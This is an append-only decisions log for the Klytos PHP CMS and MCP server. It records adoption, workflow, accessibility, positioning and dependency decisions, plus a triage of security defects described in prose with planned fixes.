# Decisions — Klytos CMS

> Append-only. A session NEVER re-opens a decision recorded here on its own initiative;
> only the user reverses a decision (append the reversal as a new entry).

## D-001 — Keel adopted in an existing project (brownfield)
- Date / phase: 2026-07-18 / Adoption
- Decision: Klytos CMS is brought under the Keel workflow via the adoption entry mode (`references/adoption.md`). Adoption documents reality and changes no code.
- Why: The project is mature and already released (self-updater, public GitHub releases, production installs), but had no Keel state (`docs/PROGRESS.md` did not exist) despite carrying a Keel lock and an outdated embedded skill copy.
- Alternatives rejected (and why): Treating it as a new project (would discard the as-built reality); resume mode (no state existed to resume from).
- Supersedes: none

## D-002 — Embedded Keel updated v1.11.0 → v3.3.0, in both trees
- Date / phase: 2026-07-18 / Adoption step 2
- Decision: The project's embedded Keel copy was replaced wholesale with the installed v3.3.0, verified file-for-file, in `.claude/skills/keel/` AND `.agents/skills/keel/` (previously only `.claude/`). The portability lock block was refreshed from the canonical copy and re-stamped v3.3.0 in `CLAUDE.md`, and `AGENTS.md` was created carrying the same block.
- Why: The Keel maintenance check found the embedded copy 20+ releases behind. The project is **open source**: forks and contributors may use any assistant (Codex, Copilot, Cursor, Gemini CLI, Windsurf, Zed, opencode, Cline…), so the workflow must travel via the open standards (`AGENTS.md` + `.agents/skills/`), not only the Claude-native paths.
- Alternatives rejected (and why): Claude-only lock and single embed tree — used on the author's private projects, but wrong here: a fork opened in a non-Claude tool would be unbound by the workflow.
- Supersedes: none

## D-003 — Project type: web app + MCP server (both security profiles)
- Date / phase: 2026-07-18 / Adoption (as-built)
- Decision: Klytos is classified as a self-hosted web application that also exposes an MCP server. Both `references/security/web-app.md` and `references/security/mcp-server.md` apply; on any conflict the stricter rule wins.
- Why: The product's primary interface is MCP (`/mcp` JSON-RPC endpoint, OAuth 2.0, 180+ core tools) sitting on top of a full PHP admin application with authentication, 2FA, payments (x402) and encrypted data at rest.
- Alternatives rejected (and why): "MCP server" alone (ignores the admin panel, sessions, CSRF, uploads); "web app" alone (ignores the model-facing threat class: tool poisoning, injection via tool results, confused deputy).
- Supersedes: none

## D-004 — Adopted as-is: stack and conventions
- Date / phase: 2026-07-18 / Adoption (as-built)
- Decision: The existing stack and conventions are adopted as-is and are the contract for new code: PHP 8.1+ with no framework; custom `spl_autoload_register` for `Klytos\Core`; `klytos_*` snake_case global helper API; PSR-12 as adapted by `phpcs.xml` (spaces inside parentheses permitted, snake_case exempted for the helper files); manager-class architecture behind `App`; pluggable `StorageInterface` (file/database); WordPress-style hooks (`klytos_do_action` / `klytos_apply_filters`).
- Why: Adoption principle 2 — conventions are observed, not imposed. Consistency with 228 existing PHP files beats Keel's defaults.
- Alternatives rejected (and why): Migrating to Composer/PSR-4/a framework — a real option, but a user decision for a future sprint, not an adoption-time change.
- Supersedes: none

## D-005 — Adopted as-is: license GPL-3.0-or-later
- Date / phase: 2026-07-18 / Adoption (as-built)
- Decision: The project is and remains GPL-3.0-or-later, with the declared clause that plugins and templates are not derivative works. Third-party vendored code under `installer/vendor-ai/` is MIT/BSD-family, compatible with GPL-3.0 distribution.
- Why: Declared in `LICENSE`, `README.md` and 195 of 228 first-party PHP file headers.
- Alternatives rejected (and why): none — this is recorded reality, not a new choice.
- Supersedes: none

## D-006 — Adopted as-is: i18n is multi-language, base English, custom JSON mechanism
- Date / phase: 2026-07-18 / Adoption (as-built)
- Decision: The product is multi-language with English as the base language, 20 shipped locales, and a custom key-based JSON mechanism (`installer/core/i18n.php`, `__('domain.key')`), not gettext. New user-facing strings go through `__()` with a catalogue key added to all locales.
- Why: The mechanism exists, the 20 catalogues are perfectly in sync (639 keys each), and switching to gettext now would be a rewrite with no user-visible benefit.
- Alternatives rejected (and why): Migrating to gettext/`.pot` (Keel's WordPress rule does not apply — this is not a WordPress project); leaving strings hardcoded (rejected — the observed hardcoding is recorded as a gap in `docs/04-adoption-audit.md`, not as an accepted practice).
- Supersedes: none

## D-007 — Accessibility target: WCAG 2.2 AA + European Accessibility Act
- Date / phase: 2026-07-18 / Adoption step 3
- Decision: The project targets WCAG 2.2 AA as the floor (AAA where feasible) plus EN 301 549 / the European Accessibility Act, applied to **both** the admin panel and the HTML Klytos generates for its users' sites.
- Why: Klytos operates in the EU market and, critically, its users inherit the accessibility of the generated output — under the EAA the legal exposure lands on them for markup they did not write. Measured reality at adoption is ~20–25% (admin) and ~15% (generated output), so this is a target with real work behind it, not a claim.
- Alternatives rejected (and why): WCAG 2.1 AA (what the shipped `klytos-accessibility` skill already asserts — but 2.2 adds focus appearance, target size and dragging movements, which are exactly the gaps measured); generated output only (the admin is also used by people with disabilities).
- Supersedes: none

## D-008 — Docs language: English
- Date / phase: 2026-07-18 / Adoption step 3
- Decision: All `docs/` artifacts and everything else Keel creates for this project are written in English.
- Why: Token economy (Keel's default), and every pre-existing document in the repo is already English — no translation needed and no inconsistency introduced. Conversation with the user continues in Spanish.
- Alternatives rejected (and why): Spanish docs (would cost 15–30% more tokens on every session's state re-read, and would fork the documentation language of an open-source project whose contributors are international).
- Supersedes: none

## D-009 — Design system: existing, token-based; current look is the baseline
- Date / phase: 2026-07-18 / Adoption step 3
- Decision: The existing token system is the design system: `installer/admin/assets/css/klytos-tokens.css` (118 `--klytos-*` tokens) for the admin, and build-time generated tokens from theme config (`installer/core/theme-manager.php`) for the frontend. There are no design source files. The UI predates Keel and has **no design contract**: the current look is the baseline. Keel Phases 3–4 are marked n/a for the existing UI.
- Why: Adoption rule — do not invent a retroactive BUILD-SPEC for a pre-existing UI.
- Alternatives rejected (and why): Reconstructing a design handoff retroactively (fabricates a contract nobody agreed to and would be audited against invented evidence).
- Applies from now on: a redesign goes through Phases 3–4 normally; small changes respect the baseline and the token system (never hardcode a colour).
- Supersedes: none

## D-010 — Assistant config package: full, for six tools
- Date / phase: 2026-07-18 / Adoption step 3
- Decision: The native assistant config package is generated for **Claude Code, OpenAI Codex, Cursor, GitHub Copilot, Gemini CLI and Windsurf** — path-scoped rules, verifier subagents, permission allow-lists where the tool supports them, the confidential-data pre-commit gate (one per project), and MCP registration. Gemini CLI is covered by `.gemini/settings.json` with `context.fileName` including `AGENTS.md` — **no `GEMINI.md` mirror**.
- Why: The project is open source. Forks and contributors will use whatever assistant they already have; binding only Claude would leave the workflow unenforced for most of them. The `context.fileName` route avoids a third copy of the lock block that could drift in a repo with many forks.
- Alternatives rejected (and why): Claude-only package (used on the author's private projects — wrong for a public repo); `GEMINI.md` mirror (more visible on clone, but one more file to keep in sync).
- Standing rule: a "—" cell in the container matrix removes the mechanism, never the duty; container parity is verified at the Phase 7 gate.
- Supersedes: none

## D-011 — Model binding: default role→model map
- Date / phase: 2026-07-18 / Adoption step 3
- Decision: Abstract roles bind to models as follows, materialized in each tool's native model field using that vendor's own identifiers: `orchestrator` → the strongest available model (session driver, judgment-heavy phases); `reviewer` → mid tier (`code-reviewer`, `security-auditor`, `design-fidelity-auditor`); `mechanical` → cheapest tier (`docs-verifier`, `playground-qa`, `launch-verifier`, `a11y-auditor`, `guide-qa`, exploration agents).
- Why: The read-only mechanical verifiers were otherwise inheriting whatever expensive model drove the session. On a flat subscription this buys speed and rate-limit headroom rather than money; on metered billing it is direct spend. Either way there is no quality argument for running a docs-coverage check on the strongest model.
- Alternatives rejected (and why): All roles on the strongest model (maximum cost and rate-limit pressure for no measurable gain on mechanical checks); no agents at all (loses the independent fresh-context reviewer, which is the point of the verifier set).
- Note: concrete model names live only in each tool's config file, never in the skill or the lock — so a model name that ages never reaches a file that travels.
- Materialized: `.claude/agents/` (reviewers `claude-sonnet-5`, mechanical `claude-haiku-4-5`; Cursor reads this tree natively), `.gemini/agents/` (reviewers `gemini-2.5-pro`, mechanical `gemini-2.5-flash`). Codex and Windsurf have no subagent mechanism — the inline fallback runs on the session model, as designed.
- **Open gap — GitHub Copilot:** the `model:` frontmatter key exists in Copilot's custom-agent reference, but no source enumerates its accepted values, and the format is inconsistent across surfaces (VS Code documents display names such as `Claude Opus 4.5` / `GPT-5.2 (copilot)`; community examples use bare slugs; there is a known CLI/VS Code string-vs-array incompatibility, github/copilot-cli#2133). The key was therefore **omitted rather than guessed**: the four `.github/agents/*.agent.md` files each state that the binding falls back to the session model. Re-attempt when Copilot documents the accepted values.
- Supersedes: none

## D-012 — Website intent: yes, Phase 8 deferred
- Date / phase: 2026-07-18 / Adoption step 3
- Decision: The project has website intent (klytos.io, already referenced in code headers, plus the root `index.html` landing page). Phase 8 is **not** run now; it runs on the user's request, normally after a release.
- Why: The immediate priority is the authorization remediation, not the site.
- Alternatives rejected (and why): Auditing the current site now (real value, but it competes with critical security work); no website intent (contradicts reality).
- Supersedes: none

## D-013 — No client budget
- Date / phase: 2026-07-18 / Adoption step 3
- Decision: There is no client to bill and no quote to produce. `docs/budget.md` is not created and the rate/currency/budget-language questions are not asked. `docs/estimate.md` and `docs/token-ledger.md` remain in force.
- Why: Klytos is the author's own open-source project.
- Alternatives rejected (and why): none.
- Supersedes: none

## D-014 — Competitive scan run at adoption
- Date / phase: 2026-07-18 / Adoption step 3
- Decision: The Phase 1 step 0 competitive scan was run (optional in adoption) and recorded in `docs/00-competitive-landscape.md`. It feeds the roadmap; it does not gate anything.
- Why: The user asked for it. The AI-first-CMS space moved fast in 2025–2026 (WordPress's own Abilities API and MCP plugins, headless CMSs shipping official MCP servers), so the positioning needs contrasting against reality rather than assumption.
- Alternatives rejected (and why): Skipping it (would have been recorded as skipped with the standard warning).
- Supersedes: none

## D-015 — Confidential-data pre-commit gate installed and verified
- Date / phase: 2026-07-18 / Adoption step 2 (installed immediately, per the adoption specifics)
- Decision: `.githooks/pre-commit` is committed and `core.hooksPath` is set to `.githooks`. One gate per project, tool-agnostic — a classic git hook fires in every environment (any assistant, any editor, a bare terminal), which is the point in an open-source repo with forks.
- Verification (evidence, not memory): a synthetic secret file was staged and the commit was **blocked** — `BLOCKED (content): keel-gate-test.txt matches a secret pattern` — then the test file was unstaged and deleted. An unverified gate is not a gate.
- Collaborator note: `core.hooksPath` is per-clone. `git config core.hooksPath .githooks` must be documented in the repo's development notes so contributors run it too — **pending**, tracked as part of the audit's H bucket.
- Exemptions: `.githooks/*`, `.claude/skills/*`, `.agents/skills/*` — the canonical trees that legitimately contain the gate's own patterns. The assistant-side check still scans them.
- Why: The repository is public and self-updating; a leaked credential here reaches forks and installed sites. The gate is the net under the assistant-side check, and it also covers commits made outside any Keel session.
- Supersedes: none

## D-016 — Export-ignore extended to every assistant config container
- Date / phase: 2026-07-18 / Adoption step 4
- Decision: `.gitattributes` now export-ignores `AGENTS.md`, `.agents/`, `.codex/`, `.cursor/`, `.gemini/`, `.windsurf/`, `.githooks/`, `.mcp.json`, `.keel-update-check` and the three nested `installer/*/AGENTS.md` context files, alongside the pre-existing `CLAUDE.md` and `.claude/` rules.
- Why: Nothing from the Keel package ships in the distributable. This was previously true only for the Claude containers, because they were the only ones that existed.
- Known adjacent defect NOT fixed here: the blanket `*.md export-ignore` also strips `README.md` and `INSTALL.md` from release archives, although `INSTALL.md` instructs users to upload them. Recorded as audit H-02 for triage, not silently changed during adoption.
- Supersedes: none

## D-017 — Repositioning: lead with the PHP + MCP + static + multilingual intersection; x402 leaves the marketing
- Date / phase: 2026-07-18 / Adoption step 6
- Decision: The product's headline message becomes **"the PHP CMS with MCP and static generation in the core — multilingual out of the box, on the hosting you already have"**. x402 is removed from the marketing message; **the x402 code stays in the product, untouched**. "AI-first CMS" is retired as the differentiating claim.
- Why (evidence, `docs/00-competitive-landscape.md`): (a) "AI-first CMS" is commoditised — WordPress core shipped the Abilities API in 6.9, Lovable is at ~$500M ARR, and Cloudflare's EmDash (MIT, self-hostable, MCP-native, Astro-based, shipped 2026-04-01) matches most of the differentiation list with 11.3k stars to Klytos's 10. (b) x402 shows zero demand across seven CMS repos, ~77% volume collapse and ~50% wash trading, and Cloudflare abandoned pay-per-crawl in July 2026 — EmDash shipping it drew 3 comments out of 504. (c) No PHP CMS has both MCP and static generation in core: Statamic needs Laravel and $349/site, Grav's MCP is a Node sidecar, WordPress's static story is plugin-only with WP2Static dead. (d) Multilingual is the highest-volume unmet defect cluster in the category (Tina has no i18n; Decap's issue open since 2020) and Klytos's 20 in-sync locales appear nowhere in its positioning.
- Time limit on this: the official PHP MCP SDK is now Symfony / PHP-Foundation maintained, so the empty intersection should be expected to fill within roughly twelve months.
- Alternatives rejected (and why): keeping x402 in the marketing (the evidence is not merely absent, it is negative — and it costs credibility on the pillars that are real); keeping "AI-first CMS" as the headline (out-marketed and out-resourced on that exact claim); dropping x402 from the code too (it costs nothing to keep, and the thesis may return).
- Consequences: `README.md`, the root `index.html` landing page and any future Phase 8 site follow this message. Audit D-05 (README's stale "160+ tools / 75+ hooks" vs the real 206 and 411) is fixed in the same work — on the extensibility axis the project undersells itself more than fivefold.
- Note recorded honestly: the biggest risk identified by the scan is **not** competition but distribution — 10 stars and a bus factor of 1, with three architecturally similar projects (LightCMS 23 stars, Seite 13, VoxelSite 4) documented as having been right and gone nowhere. Repositioning addresses visibility; it does not address the bus factor.
- Supersedes: none

## D-018 — Adoption audit triaged
- Date / phase: 2026-07-18 / Adoption step 5
- Decision: **Fix now (Sprint 1):** S-01…S-09 + T-01 — the whole authorization axis, the SSRF, the broken public comment handler, and a minimal test harness. **Fix when touched:** the remaining 23 findings, each bound to a named trigger in `docs/04-adoption-audit.md`. **Accepted: none** — nothing was written off as permanent.
- Why: Authorization is the weak axis of a product whose premise is handing control to an autonomous agent — that ordering is not negotiable. T-01 joins it because an authorization fix cannot be demonstrated by reading a diff; Keel's test-point rule needs a command and an output.
- Alternatives rejected (and why): critical-only (S-01/S-02/S-03) — leaves S-07's systemic ~70% ungated surface open, so the same class of bug returns with the next endpoint; adding H-01…H-04 to Sprint 1 — real defects, but the next release runs the full Phase 7 where they close by construction, and widening Sprint 1 delays the security work.
- Supersedes: none

## D-019 — Competitive scan recorded as partial; no user-supplied competitors
- Date / phase: 2026-07-18 / Adoption step 3 (asked late — the scan had already run)
- Decision: `docs/00-competitive-landscape.md` stands as written, with its **partial** status on the record. The user reported no additional competitors beyond those in the report.
- Why: Phase 1 step 0's opening question ("which competitors do you already know about?") was skipped when the scan was launched; it was asked afterwards and answered "none relevant". Recording the process gap rather than pretending the sequence was correct.
- Uncovered surfaces, named so a later pass knows where to look: Reddit required a mirror, the 200-call search budget was exhausted, and Lobsters, IndieHackers, ProductHunt and WPTavern went unexamined. These are *uncovered*, not *negative evidence*.
- Supersedes: none

## D-020 — MCP tool authorization deferred to Sprint 2, not folded into Sprint 1
- Date / phase: 2026-07-18 / Phase 5, Sprint 1 planning
- Decision: The newly found gap NEW-02 — `klytos_has_permission` appears **zero** times across all 34 files and 172 tools in `installer/core/mcp/tools/` — is fixed in a **dedicated Sprint 2**, not added to Sprint 1. Sprint 1 builds the `klytos_require_permission()` helper that Sprint 2 reuses.
- Why: Gating 172 tools needs its own tool→capability map, an enforcement point in `ToolRegistry`, and its own test set. Folding it into Sprint 1 would roughly double the sprint and delay the admin-side authorization fix that is already triaged and planned. A sprint that cannot close is worse than two that can.
- Stated plainly, not buried: **when Sprint 1 closes, the admin surface is gated and the product's primary interface is not.** MCP auth proves *who* the caller is, never *what* they may do, so any app-password holder currently has owner-level power over the CMS.
- Alternatives rejected (and why): adding it to Sprint 1 (no window where admin is gated and MCP is not — but Sprint 1 stops being closeable); a coarse blanket owner-gate in `ToolRegistry` now (closes the escalation fast, but over-restricts legitimate editor/viewer MCP use until the fine-grained map lands, and an over-restrictive gate tends to get reverted under pressure rather than refined).
- Supersedes: none. Extends the D-018 triage with a finding that did not exist when it was made.

## D-021 — `klytos_current_user()` fails closed, with a migration for the installed base
- Date / phase: 2026-07-18 / Phase 5, Sprint 1 planning
- Decision: The v1.x compatibility fallback in `klytos_current_user()` (`installer/core/helpers-global.php:390-397`), which returns a hardcoded `'role' => 'owner'` whenever `$auth->getUserId()` is empty or `UserManager` throws, is changed to return **null (deny)**. The existing `UserManager::migrateFromV1Config()` (`user-manager.php:646`) is wired into boot as an idempotent migration so live v1.x installs get a real owner record instead of being locked out.
- Why: Any authenticated session lacking `klytos_user_id` is currently promoted to owner silently. This defeats **every** gate Sprint 1 adds, which makes it a prerequisite rather than an addition. It was not in the adoption audit — it was found during the Sprint 1 kickoff re-validation, which is precisely what that step exists for.
- Alternatives rejected (and why): remove the fallback with no migration (safest against escalation, fastest to ship — but a v1.x install whose migration has not run locks out its owner, and this is a self-updating CMS with production installs, so that is a real support incident); keep it, narrow it and log it to measure real-world frequency (lowest breakage risk, but leaves the escalation open for the whole sprint while the sprint's entire purpose is closing it).
- Verification required (not optional): the upgrade path is tested **from the real previous version**, not only from a clean install — mandatory whenever `Installed base: yes`.
- Supersedes: none.

## D-022 — Dev-only `composer.json`, plus a manifest for the vendored dependencies
- Date / phase: 2026-07-18 / Phase 5, Sprint 1 planning
- Decision: A root `composer.json` is added with **`require-dev` only** (`phpunit/phpunit`, `squizlabs/php_codesniffer`). The runtime stays dependency-free. `composer.json`, `composer.lock` and `vendor/` are export-ignored so nothing ships. Additionally, a manifest is reconstructed for `installer/vendor-ai/` (482 files, 9 packages) so the vendored code can be audited with `composer audit`.
- Why: PHPUnit and PHPCS exist only as global installs on the author's machine, so "lint and tests pass" is not reproducible for a contributor or in CI — which makes every test-point claim unverifiable by anyone else. The vendored half (audit H-04, HIGH) cannot be checked against CVEs at all today; for a self-updating CMS with production installs, an unauditable dependency tree is a standing risk, not a hygiene nit.
- Alternatives rejected (and why): dev-only manifest without the `vendor-ai/` work (cheaper and lower-risk, but leaves H-04 HIGH open with no trigger to close it); no manifest at all (preserves the adopted state exactly, but keeps tests unreproducible and blocks CI, which is the same failure mode T-01 already records as CRITICAL).
- Standing rule for the CVE audit: findings are **reported and triaged with the user, never silently patched**. An upgrade across 482 vendored files is a scope change (→ Estimate v2), not a slice detail.
- Supersedes: the `docs/03-technical-plan.md` §1 dependency-manifest line ("no dependency manifest at project level") — an as-built record, not a prior decision. That line is updated in the same slice.

## D-023 — Theme becomes an installable, validated package; design enters via an authoring skill
- Date / phase: 2026-07-18 / Phase 5 (scope change, designed only — not implemented)
- Decision: The frontend visual layer is redesigned around a **theme package**: a directory with a manifest (`klytos-theme.json`, ID = directory name, mirroring the immutable plugin contract) owning its templates, parts, CSS, self-hosted fonts and assets, plus style variations. Klytos stops shipping a look and instead guarantees a **contract** in three parts — placeholder vocabulary, an expanded frontend token system, and a landmark/accessibility contract — while fixing nothing about arrangement. A design produced by Claude Design (or any agent) enters through a new `klytos-theme-authoring` skill and is **refused at install time by a validator** if it violates the contract. Templates gain `extends` inheritance. The design brief becomes a machine-readable artifact stored with the theme. Full spec: `docs/theme-package-model.md`.
- Why: The starting premise (that Klytos over-restricts header/footer) is false and the code disproves it — `klytos_set_part` already accepts completely free HTML/CSS for any named part (`installer/core/mcp/tools/part-tools.php:88-89`). The real defect is that this freedom has **no contract**: the design brief is never persisted (prose in a chat transcript, `installer/core/guides/site-builder.md:85-166`), the frontend exposes only 14 CSS variables against the admin's ~118, base CSS is a 243-line heredoc inside PHP (`build-engine.php:1543`), distinctive design is deliberately steered into per-page `wp:html` blobs outside every system, and nothing is portable or versionable. Decisively, audit A-05 (HIGH) records **zero** `aria-`/`role=` attributes in the generated output: an unvalidated free-HTML part system makes that permanently unfixable, and under the EAA the exposure lands on Klytos's users (D-007). A validated contract is the only mechanism that fixes accessibility at the system level rather than once per site.
- Alternatives rejected (and why): extending the current record with more knobs (leaves base CSS in PHP and the design as a `custom_css` blob — treats the symptom); a freeform HTML/CSS importer as the canonical path (no contract, so unpredictable results, unmaintainable output and no accessibility guarantee — it may exist later as an assisted converter that still emits a package through the same validator).
- Consequences: closes the shipped model drift — `klytos_set_part` vs the superseded global-blocks model still taught by the `klytos-custom-templates` skill, which no shipped skill reconciles today. The structural heuristics in `build-engine.php:553-660` (raw `<header` string matching + top-bar auto-injection) are replaced by manifest-declared structure. A default package generated from today's `getBaseCss()` + the 26 scalars keeps every production install rendering byte-identically (installed base is real).
- Relation to D-009: does **not** supersede it. D-009 records that the pre-Keel UI has no design contract and that the current look is the baseline; that remains true for the admin. D-020 establishes, for the frontend and on the new model, the contract D-009 recorded as absent.
- Sequencing (explicit user decision): **planned now, implemented after Phase 5 Sprint 1** (S-01…S-09 + T-01, D-018). The authorization axis does not wait for a theme redesign. As a genuine redesign it then runs through Keel Phases 3–4 — the first time this project does — which is also the review trigger for the deferred `design-fidelity-auditor`.
- Supersedes: none

## D-024 — The design agent connects over MCP as an authoring loop, package-scoped and preview-only
- Date / phase: 2026-07-18 / Phase 5 (scope change, designed only — not implemented; extends D-023)
- Decision: Klytos exposes a dedicated **design authoring surface** over its existing MCP server so an external design agent (Claude Design or any other MCP-capable agent) can connect to a site and work against it. The surface is deliberately shaped as a **read → validate → preview → iterate loop whose unit of exchange is the theme PACKAGE, never an individual mutation**: the agent reads the contract and a description of the site, submits a complete package, receives concrete validation errors or a rendered preview, and iterates. It works **only against a preview target**; activating a theme on the published site is a separate human action. Individual write tools (`klytos_set_part`, `set_colors`, `custom_css`) are NOT part of this surface.
- Why: The obvious shape — letting the design agent push the design live, mutation by mutation — was rejected because it reproduces the exact defect D-023 diagnoses: imperative, runtime, unvalidated, site-bound design that is not portable, not versionable and not auditable. It would also be no new capability, since the MCP server already exposes those write tools today. What the design agent genuinely lacks is (a) the ability to READ the site and the contract it must satisfy — today it designs blind, which is why the brief degenerates into prose — and (b) a feedback loop with real rendered output. MCP is the right transport for both, and package-scoping keeps D-023's invariant intact: the package is the artifact, the validator is the gate.
- Security rationale (this is the decisive constraint, not a footnote): `klytos_set_part` accepts a `js` parameter that is emitted as a `<script>` tag on **every page**, and stores `html` without passing it through `kses` (`installer/core/mcp/tools/part-tools.php:88-99`, `installer/core/part-manager.php:84-85`). A live-write design surface therefore hands an external agent global stored-XSS on a production site, on the very axis (authorization) the project already records as its weakest — D-018, S-01…S-09. Preview-only + package-scoped + a dedicated `theme.*` capability + separate human activation bounds the blast radius. Applies both security profiles per D-003; the stricter wins.
- Alternatives rejected (and why): **live direct write** (immediate and superficially simpler, but recreates the diagnosed defect and opens the JS-injection path above); **read-only** (safest and simplest, package delivered out of band as a file — but it drops the render-feedback loop, which is half the value and the reason the current prose-brief model fails).
- Open unknown, deliberately NOT assumed: whether Claude Design can act as an MCP client against an arbitrary server has **not** been verified. The surface is therefore specified for a generic MCP-capable agent, so it remains useful if Design cannot connect directly. Verify before implementation.
- Supersedes: none — extends D-023.


## D-025 — Gate zero is baseline-locked, not "phpcs clean"
- Date / phase: 2026-07-18 / Phase 5, Sprint 1 slice 0
- Decision: The project's gate zero, defined in `docs/03-technical-plan.md` §4 as *phpcs clean + the app boots + one MCP `tools/list` round trip*, is amended. The lint condition becomes: **zero violations in the files a slice touches, and the measured baseline does not grow.** The baseline is recorded as **204 errors / 488 warnings across 114 files** in `installer/core` + `installer/admin`, measured with `phpcs --standard=phpcs.xml --report=summary` on 2026-07-18.
- Why: The literal condition was never achievable — the baseline predates Keel and has never been clean, so gate zero as written would block every slice from starting, which is the opposite of its purpose. Baseline-locking is the standard treatment for a brownfield codebase: new code enters clean, old code is cleaned when it is touched anyway.
- Verified before deciding, not assumed: both files added in slice 0 (`scripts/dev/seed-playground.php`, `scripts/dev/router.php`) lint **clean** under the project ruleset. The problem is inherited, not introduced.
- Alternatives rejected (and why): running `phpcbf` now over the 114 files (203 of 204 are auto-fixable, and it would satisfy the literal gate — but it produces an enormous diff across almost all of `installer/` immediately before a security sprint, with **no test harness yet** to catch a regression, and it would be reviewed tangled up with the authorization fixes); deferring the sweep to a dedicated slice after Sprint 1 (tidier, but adds pending work that tends to stay pending — the trigger below covers the same ground without a standing debt).
- Trigger for reducing the baseline: opportunistic. Any slice that touches a file leaves it clean. The baseline number is re-measured at each sprint close and recorded — it may not increase.
- Note: the IDE in use reports **WordPress Coding Standards** diagnostics for this repository, which contradict D-004 (PSR-12 with spaces inside parentheses, `camelCase` locals). Those diagnostics are noise and are ignored; `phpcs --standard=phpcs.xml` is the only authority.
- Supersedes: the gate-zero definition in `docs/03-technical-plan.md` §4 (as-built record, amended in the same change).

## D-026 — NEW-03 and NEW-04 are fixed after Sprint 1, not inside it
- Date / phase: 2026-07-18 / Phase 5, Sprint 1 slice 0
- Decision: The two production bugs found by the playground's first boot are recorded and **not** fixed in Sprint 1. **NEW-03** (by-reference action listeners never bind; every page create warns and the x402 default injection silently does nothing) gets its own slice with tests. **NEW-04** (`build` writes into the repository root, overwriting the tracked `.htaccess`) is bound to the theme-package sprint (D-023), which needs a safe build target regardless.
- Why: D-018 prioritized the authorization axis above everything, and that ordering is not re-opened on the assistant's initiative. NEW-03's correct fix changes the signature of `Hooks::doAction()`, which backs 301 registered actions — that is a deliberate, separately-tested change, and doing it before the test harness exists (slice 1) would be exactly the kind of unverified core surgery this sprint exists to make impossible.
- Accepted cost, stated plainly: the NEW-03 warning will pollute the output of every test point in this sprint (mitigated by `XDEBUG_MODE=off`, documented in `docs/playground.md`), and x402's post-type default stays broken in production meanwhile.
- Alternatives rejected (and why): fixing NEW-03 inside Sprint 1 after slice 1 (defensible — the harness would exist — but it still widens a sprint whose scope was deliberately bounded); fixing both before continuing (cleanest ground to build on, but delays precisely the work triaged as most urgent).
- Supersedes: none.

## D-027 — PHPUnit is pinned to ^11.5, and `composer.lock` is tracked
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 1
- Decision: The dev manifest (D-022) pins `phpunit/phpunit: ^11.5` and `squizlabs/php_codesniffer: ^3.13`, and **`composer.lock` is committed** — the pre-Keel `.gitignore` line that excluded it is removed. Both files stay out of the distributable through `export-ignore`, never through `.gitignore`.
- Why: D-022 named the two packages but not their versions, and the point of the whole manifest is that a contributor and CI resolve **the same** versions the author ran — an ignored lock file defeats exactly that, so tracking it is implementing D-022, not amending it. `^11.5` matches the PHPUnit already installed globally on the author's machine (11.5.53), so the existing workflow and its results are reproduced rather than migrated in a security sprint.
- Consequence, stated rather than discovered later: **PHPUnit 11 requires PHP 8.2+, while Klytos itself supports PHP 8.1+ (D-004).** The test suite therefore cannot run on the lowest supported runtime, so CI cannot verify PHP 8.1 through the suite. Nothing in the product changes; the gap is in verification coverage only.
- Alternatives rejected (and why): **PHPUnit ^10** — the only line still supporting PHP 8.1, which would close the coverage gap above, but it reached end of life in Feb 2025, so the harness would start on an unmaintained runner in a sprint whose whole purpose is security. **PHPUnit ^12** — current and supported, but requires PHP 8.3+, widening the same gap by two minor versions for no gain here.
- Trigger for revisiting: when the support matrix is next verified, or when CI is introduced (whichever comes first) — decide then whether PHP 8.1 support is real enough to warrant a runner the suite can actually execute on, or whether the floor should rise to 8.2.
- Supersedes: none — implements D-022.

## D-028 — The `vendor-ai/` manifest pins every package exactly, transitive ones included, and does not block on advisories
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 2
- Decision: The manifest reconstructed for the vendored AI tree lives at **`installer/composer.json`** with `config.vendor-dir = "vendor-ai"`, and `installer/composer.lock` is tracked beside it. It pins **all 16 packages at exact versions**, transitive dependencies included — not just the single genuine root requirement (`soukicz/llm` 0.5.0). `config.platform.php` is set to `8.3.0`, and `config.audit.block-insecure` is set to `false`.
- Why (each part, because each was a real choice):
  - **Placement.** `vendor-ai/composer/installed.php` records the root package's `install_path` as `installer/`, so `installer/` with `vendor-dir: vendor-ai` is the layout that actually produced this tree. Any other placement would need a relative-path hack and would describe a tree nobody built.
  - **Exact pins on transitive packages too.** Requiring only `soukicz/llm` would let Composer resolve its dependencies to *newer* versions than the ones vendored — so `composer audit` would report on a tree that does not ship, which is worse than no audit. Verified: the lock resolves to the 16 vendored versions with zero deltas.
  - **`platform.php = 8.3.0`.** Makes resolution independent of whichever PHP a contributor runs. It also states NEW-06 out loud: `soukicz/llm` requires PHP >= 8.3 while Klytos declares 8.1+.
  - **`block-insecure: false`.** Composer 2.9 refuses to resolve packages with known advisories, which made the lock ungeneratable — the manifest could not describe reality precisely *because* reality is vulnerable. The manifest's job is to record what ships; `composer audit` is the reporting mechanism, and it reports fully with this flag off.
- Alternatives rejected (and why): a manifest under `scripts/dev/` (keeps the product tree untouched, but misrepresents the layout and needs `../../` vendor-dir plumbing); requiring only the root package (faithful to the original authored manifest, but audits a resolved set that is not the shipped one); leaving `block-insecure` on (the resolution failure is itself a signal — but it yields no lock, hence no `composer audit`, hence no per-CVE detail to triage, which is the whole deliverable).
- Distribution: both files are already export-ignored by the existing unanchored `composer.json` / `composer.lock` rules in `.gitattributes` — verified with `git check-attr export-ignore`, not assumed. Nothing new ships.
- Drift guard, not a promise: `tests/Unit/VendorAiManifestTest.php` asserts manifest ≡ lock ≡ `composer/installed.php` ≡ `LICENSE-THIRD-PARTY.md`, in both directions. Proven to fail on injected drift before it was trusted (evidence in `docs/05-test-points.md`).
- Standing rule reaffirmed (D-022): the CVEs this manifest exposed (NEW-05) are **reported and triaged with the user, never silently patched**.
- Supersedes: the `docs/03-technical-plan.md` §1 line "Vendored deps … no manifest" and its "Risk, recorded not fixed" note — as-built records, updated in the same slice. Closes audit H-04.

## D-029 — NEW-05's five CVEs are remediated in a dedicated slice AFTER Sprint 1, not inside it
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 2 (user triage, per D-022's standing rule)
- Decision: The 5 medium CVEs found by the project's first `composer audit` — `guzzlehttp/guzzle` 7.10.0 (CVE-2026-55767, CVE-2026-55568) and `guzzlehttp/psr7` 2.9.0 (CVE-2026-55766, CVE-2026-49214, CVE-2026-48998) — are **recorded and not fixed in Sprint 1**. Remediation becomes its own slice immediately after Sprint 1 closes, with its own test point and its own estimate version.
